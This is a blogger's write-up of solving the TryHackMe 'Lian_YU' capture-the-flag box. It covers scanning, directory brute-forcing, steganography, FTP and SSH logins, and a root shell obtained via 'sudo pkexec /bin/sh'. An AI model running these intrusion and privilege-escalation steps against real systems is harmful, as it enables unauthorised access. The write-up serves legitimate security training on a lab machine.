# Tryhachme Lian_YU

## *Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.*

I start first by deploying our target so that we can get a ip-address. For this write-up, i will be using my ip adress as lian_yu.thm.

I started with enumeration

```bash
$ >.. sudo nmap -Pn -sVC lian_yu.thm  -min-rate=1000 -T4 -oN nmap-scan
# Nmap 7.94 scan initiated Wed Sep 13 19:39:04 2023 as: nmap -Pn -sVC -min-rate=1000 -T4 -oN nmap-scan 10.10.138.34
Nmap scan report for 10.10.138.34
Host is up (4.2s latency).
Not shown: 520 filtered tcp ports (no-response), 476 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33024/udp6  status
|   100024  1          33470/tcp6  status
|   100024  1          42903/udp   status
|_  100024  1          58893/tcp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 13 19:39:33 2023 -- 1 IP address (1 host up) scanned in 28.83 seconds
```

From our enumartion resuls, we have five (5) ports that are open.

Let’s go check what is on port 80 (Apache httpd)

![Screenshot from 2023-10-01 14-26-05.png](Tryhachme%20Lian_YU%20ac6adfea2edd4941b035c1cad013a1f0/Screenshot_from_2023-10-01_14-26-05.png)

There’s no much stuff on the website even after checking the source code just a story on Arrowverse

I launched my favourite directory enumeration tool ‘Feroxbuster’

```bash
feroxbuster -u http://lian_yu.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://lian_yu.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       59l      358w     2506c http://10.10.142.115/
301      GET        7l       20w      236c http://lian_yu.thm/island => http://lian_yu.thm/island/
301      GET        7l       20w      241c http://lian_yu.thm/island/2100 => http://lian_yu.thm/island/2100/
404      GET        0l        0w      196c http://10.10.142.115/island/talkback_permalink
```

So after the directory eunmeration i found two (2) directories  that are running which are:

- **http://ian_yu.thm/island/**
- **http://lian_yu.thm/island/2100**/

i checked **[http://ian_yu.thm/island/](http://ian_yu.thm/island/)** 

![Screenshot from 2023-10-01 19-56-53.png](Tryhachme%20Lian_YU%20ac6adfea2edd4941b035c1cad013a1f0/Screenshot_from_2023-10-01_19-56-53.png)

There wasn’t much there so i decided to chech the source code to see if i can find any hint

![Screenshot from 2023-10-01 19-57-10.png](Tryhachme%20Lian_YU%20ac6adfea2edd4941b035c1cad013a1f0/Screenshot_from_2023-10-01_19-57-10.png)

Viewing the source code shows the next clue: **vigilante.** This looked like a username. But now, we need a password to go with it.

- I checked **http://lian_yu.thm/island/2100**/

![Screenshot from 2023-10-01 20-02-15.png](Tryhachme%20Lian_YU%20ac6adfea2edd4941b035c1cad013a1f0/Screenshot_from_2023-10-01_20-02-15.png)

The page is showing an unavailable video from youtube. so, i also decided to chech the source code

![Untitled](Tryhachme%20Lian_YU%20ac6adfea2edd4941b035c1cad013a1f0/Untitled.png)

There is hint ‘.ticket’. This hint for us to do another dir enumeration for extension .ticket. This time i gonna use gobuster. Gobuster make it easy for me to specify the extension that i need.

```bash
gobuster dir -u http://lian_yu.thm/island/2100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .ticket
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.94
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
2023/10/01 20:06:41 Starting gobuster in directory enumeration mode
===============================================================
Progress: 20244 / 441122 (17.59%)
/green_arrow.ticket   (Status: 200) [Size: 71]
===============================================================
2023/10/01 20:17:28 Finished
===============================================================
```

This led to the following intriguing file. ‘/green_arrow.ticket’ 

i now have a new result from our directory enumeration ‘********http://lian_yu.thm/island/2100/green_arrow.ticket’******** 

I checked the the new directory using curl on my terminal

```bash
$ >.. curl http://10.10.117.94/island/2100/green_arrow.ticket                

This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

I copied ‘**************************************RTy8yhBQdscX’************************************** and used an online tool ‘[https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier)  ****************to analyze the file. 

It turns out that the text was encoded with ************base58.************ so i opened cyberchef ([https://gchq.github.io/](https://gchq.github.io/)) to decode it 

![Untitled](Tryhachme%20Lian_YU%20ac6adfea2edd4941b035c1cad013a1f0/Untitled%201.png)

since the page we got the string from says ‘*This is just a token to get into Queen's Gambit(Ship)”* i think it should be a password to something 

I log in into the FTP server using

vigilante : !*******d

```bash
$ >.. ftp 10.20.117.944
Connected to 10.10.117.94.
220 (vsFTPd 3.0.2)
Name (10.10.117.94:l33): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

i successfully got access into the FTP sever, i want to check what files are available on the server and get them

```bash
ftp>ls -lah
229 Entering Extended Passive Mode (|||39859|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> get .other_user
local: .other_user remote: .other_user
229 Entering Extended Passive Mode (|||52160|).
150 Opening BINARY mode data connection for .other_user (2483 bytes).
100% |*************************************************|  2483       13.92 MiB/s    00:00 ETA
226 Transfer complete.
2483 bytes received in 00:00 (8.63 KiB/s)
ftp> get Leave_me_alone.png
local: Leave_me_alone.png remote: Leave_me_alone.png
229 Entering Extended Passive Mode (|||34402|).
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
  0% |                                                 |     0        0.00 KiB/s    --:-- ETAg 39% |*******************                              |   196 KiB   98.43 KiB/s    00:03 ETAg100% |*************************************************|   499 KiB  140.56 KiB/s    00:00 ETA
226 Transfer complete.
511720 bytes received in 00:03 (135.02 KiB/s)
ftp> get Queen's_Gambit.png
local: Queen's_Gambit.png remote: Queen's_Gambit.png
229 Entering Extended Passive Mode (|||18129|).
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
100% |*************************************************|   537 KiB  181.52 KiB/s    00:00 ETA
226 Transfer complete.
549924 bytes received in 00:03 (169.63 KiB/s)
ftp> get aa.jpg
local: aa.jpg remote: aa.jpg
229 Entering Extended Passive Mode (|||31997|).
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
100% |*************************************************|   186 KiB  155.42 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:01 (130.32 KiB/s)
ftp> get .other_user
local: .other_user remote: .other_user
229 Entering Extended Passive Mode (|||31919|).
150 Opening BINARY mode data connection for .other_user (2483 bytes).
100% |*************************************************|  2483        7.21 MiB/s    00:00 ETA
226 Transfer complete.
2483 bytes received in 00:00 (5.97 KiB/s)
```

From the FTP server i was able to get some files

- ************aa.jpg************
- **********Leave_me_alone.png**********
- ********************************Queen’s_Gambit.png********************************
- **********************.other_user**********************

I started by check the files one after the other using ***************************exiftool.***************************

```bash
$ >.. exiftool aa.jpg            
ExifTool Version Number         : 12.63
File Name                       : aa.jpg
Directory                       : .
File Size                       : 191 kB
File Modification Date/Time     : 2020:04:30 23:25:59-04:00
File Access Date/Time           : 2023:10:01 20:42:32-04:00
File Inode Change Date/Time     : 2023:10:01 20:42:32-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1200
Image Height                    : 1600
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1200x1600
Megapixels                      : 1.9
                                                                                              
$ >.. exiftool "Queen's_Gambit.png" 
ExifTool Version Number         : 12.63
File Name                       : Queen's_Gambit.png
Directory                       : .
File Size                       : 550 kB
File Modification Date/Time     : 2020:05:05 07:10:55-04:00
File Access Date/Time           : 2023:10:01 20:42:24-04:00
File Inode Change Date/Time     : 2023:10:01 20:42:24-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1280
Image Height                    : 720
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
XMP Toolkit                     : XMP Core 5.4.0
Orientation                     : Horizontal (normal)
Image Size                      : 1280x720
Megapixels                      : 0.922
                                                                                              
$ >.. exiftool Leave_me_alone.png 
ExifTool Version Number         : 12.63
File Name                       : Leave_me_alone.png
Directory                       : .
File Size                       : 512 kB
File Modification Date/Time     : 2020:04:30 23:26:06-04:00
File Access Date/Time           : 2023:10:02 11:10:39-04:00
File Inode Change Date/Time     : 2023:10:02 11:10:39-04:00
File Permissions                : -rw-r--r--
Error                           : File format error
```

After checking the flies with ***************************exiftool*************************** i noticed that **************************************Leave_me_alone.png************************************** has a file format error.

I tried to correct the error since it was a .png file. The first 16 digits magic number of a .png file is ******89 50 4E 47 0D 0A 1A 0A .******  I editied the magic number of ******************Leave_me_alone.png****************** using ****************Hexedit**************** and see if the error would be corrected.

```bash
$ >.. hexedit Leave_me_alone.png
00000000   **89 50 4E 47  0D 0A 1A 0A  00 00 00 0D  49 48 44 52**  .PNG........IHDR
00000010   00 00 03 4D  00 00 01 DB  08 06 00 00  00 17 A3 71  ...M...........q
00000020   5B 00 00 20  00 49 44 41  54 78 9C AC  BD E9 7A 24  [.. .IDATx....z$
00000030   4B 6E 25 08  33 F7 E0 92  64 66 DE A5  55 7B 69 34  Kn%.3...df..U{i4
00000040   6A 69 54 FD  F5 73 CE BC  C0 3C 9C 7E  B4 D4 A5 56  jiT..s...<.~...V
00000050   49 55 75 D7  5C 98 5C 22  C2 DD 6C 3E  00 E7 C0 E0  IUu.\.\"..l>....
00000060   4E 66 A9 4A  3D 71 3F 5E  32 C9 08 5F  CC CD 60 C0  Nf.J=q?^2.._..`.
00000070   C1 C1 41 F9  7F FE DF FF  BB 2F EB 22  FA B5 AE AB  ..A....../."....
00000080   7D 9D CF E7  F8 1E 5F CB  49 CE ED 94  7E B7 D8 D7  }....._.I...~...
00000090   72 3C C9 E9  74 92 D3 D3  49 4E C7 93  9C 8F 8B 2C  r<..t...IN.....,
000000A0   4B B3 7F 2F  C7 45 CE A7  45 D6 D3 59  DA D2 44 A4  K../.E..E..Y..D.
000000B0   48 EF 5D F4  D5 7B 11 29  45 6A E9 52  4A 91 D6 44  H.]..{.)Ej.RJ..D
000000C0   F4 2F FA 6F  BE F4 BD F6  FE 5E A5 E9  77 7B 5F B3  ./.o.....^..w{_.
000000D0   DF E9 67 F4  78 A5 54 11  F1 DF D5 6A  1F 12 D1 63  ..g.x.T....j...c
000000E0   FF 19 2F BD  06 3B 8C 9E  B9 E8 31 56  FB D9 8E DD  ../..;....1V....
000000F0   0F BB 77 D7  67 9F 2F E9  5A E3 98 76  17 0D 7F 1F  ..w.g./.Z..v....
00000100   D7 D1 E2 33  C5 BE F4 7A  27 FC 6C F7  D5 C7 B1 6A  ...3...z'.l....j
00000110   AD 52 7A 4F  9F 19 E7 E2  F8 E9 E7 0E  87 C9 DF 3B  .RzO...........;

                                Save changes (Yes/No/Cancel) ?

00000150   5A 91 22 D5  CE D5 74 3C  F2 6D 96 65  7B 9D E2 E3  Z."...t<.m.e{...
00000160   54 27 BD 97  26 52 7B BA  46 8E 2B 7F  A7 DF 9B E8  T'..&R{.F.+.....
00000170   01 F5 BB 9E  8F E7 CD 63  A5 CF 7B 3C  A3 7C AC 31  .......c..{<.|.1
00000180   A6 BD 71 BC  9B B4 76 12  91 49 DA DA  7D 1E C5 FC  ..q...v..I..}...
00000190   E0 93 2B D2  D6 82 67 33  E6 94 1E 70  5D 39 CA 4D  ..+...g3...p]9.M
000001A0   74 2A 55 7B  36 25 E6 97  7D D5 2E A5  76 A9 65 B2  t*U{6%..}...v.e.
000001B0   F9 C6 63 CF  F3 6C 3F DB  98 4E 93 C8  B4 E2 9E 0E  ..c..l?..N......
000001C0   32 CF 55 EA  E4 63 A4 EF  D3 B9 A9 3F  EB FB F8 5D  2.U..c.....?...]
000001D0   DF CB 63 8C  B9 51 65 AA  B3 4C E5 E0  C7 2A FA 7E  ..c..Qe..L...*.~
000001E0   FF 8C BE EC  73 D5 D7 83  FE 9C EF B5  F7 E9 D9 7C  ....s..........|
000001F0   D4 B5 A0 6B  D9 9F 8F 3F  57 E9 B3 8D  4A 2D 2B 3E  ...k...?W...J-+>
00000200   67 FF 92 D2  FC DF BA 9E  3F 7E BC B3  EB 78 7D FB  g.......?~...x}.
00000210   06 EB 89 F3  76 B5 F9 38  CF 3A 9E AB  3C 3E 1E E5  ....v..8.:..<>..
00000220   E9 E9 24 6F  5F BF B1 71  D6 DF E9 6B  59 16 7F BF  ..$o_..q...kY...
00000230   9C ED B9 14  1B BB 49 D6  45 EF 53 7F  B7 D8 7B CE  ......I.E.S...{.
00000240   EB 6A CF AC  4E 07 99 E6  83 AF 45 7D  1A AD C9 DA  .j..N.....E}....
00000250   BA 3C 3D AD  B2 9C DC E6  70 CC 1E EE  1E E4 EE EE  .<=.....p.......
-**  Leave_me_alone.png       --0x4/0x7CEE8--0%--------------------------------
```

After i edited the magic numbers i used ******************exiftool****************** to look at it again and now the error is gone.

I opened Leave_me_alone.png to check the content

![Leave_me_alone.png](Tryhachme%20Lian_YU%20ac6adfea2edd4941b035c1cad013a1f0/Leave_me_alone.png)

I used **stegseek** to see if there are any hidden files in all the files i got from the ftp server

```bash
$ >.. stegseek Queen_Gambit.png   
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file "Queen_Gambit.png" is not supported.
                                                                                              
$ >.. stegseek Leave_me_alone.png 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file "Leave_me_alone.png" is not supported.
                                                                                              
$ >.. stegseek aa.jpg            
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
```

I found out that there is an hidden file ******************‘ss.zip’****************** inside ********‘aa.jpg’.******** 

The content of ******************Leave_me_alone.png****************** is the passphrase to extract the hidden contents in ************aa.jpg************ using steghide or any other steganography tool

The hidden file is a .zip file. i extacted the content using unzip

```bash
$ >.. unzip ss.zip
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado
```

Turns out that there are two files in ************ss.zip.************ i check the contents of each file extartced from ************ss.zip************

```bash
$ >.. cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

                                                                                              
$ >.. cat shado     
M*******n
```

The contents of shado look likes a password but i do not have a username for it yet.

Remember from the FTP server we have a file ****************.other_user**************** 

```bash
$ >.. cat .other_user 
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.

```

I now have a username and a password. i tried to login with is to ******ssh****** server and it worked

```bash
$ >.. ssh slade@10.10.17.135
The authenticity of host '10.10.17.135 (10.10.17.135)' can't be established.
ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:68: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.17.135' (ED25519) to the list of known hosts.
slade@10.10.17.135's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝

        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$
```

****************YAY!!!!**************** i got a shell in the ssh server

```bash
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
THM{P*****_****_*******__*********_*****}
                        --Felicity Smoak
```

Now it’s time for privilege escalaion.

The first thing i check when i have a user password is **sudo -l** to check the sudoers.

```bash
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

After checking the sudoers it shows that i can use ******************************/usr/bin/pkexec****************************** to escalate my privilege since it is the sudoers file.

I checked [https://gtfobins.github.io/](https://gtfobins.github.io/) to see how i would use it

```bash
slade@LianYu:~$ sudo pkexec /bin/sh
#
```

![Screenshot from 2023-10-02 13-50-42.png](Tryhachme%20Lian_YU%20ac6adfea2edd4941b035c1cad013a1f0/Screenshot_from_2023-10-02_13-50-42.png)

After i ran it i was able to escalate my privilege and was able to be a user as root

```bash
# ls
root.txt
```

I now have access to root.txt

```bash
# cat root.txt
                          Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 

THM{M*_****_**_**_****_**_*_******_****_********_****_**_****_**_*********_**_***_***_****}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

### Mission accomplished

### 

### Thank you for reading this write-up!

### Created by ****shayolee(THM) sHayo_l33(x foemrly twitter) https://twitter.com/shayo_l33 ****
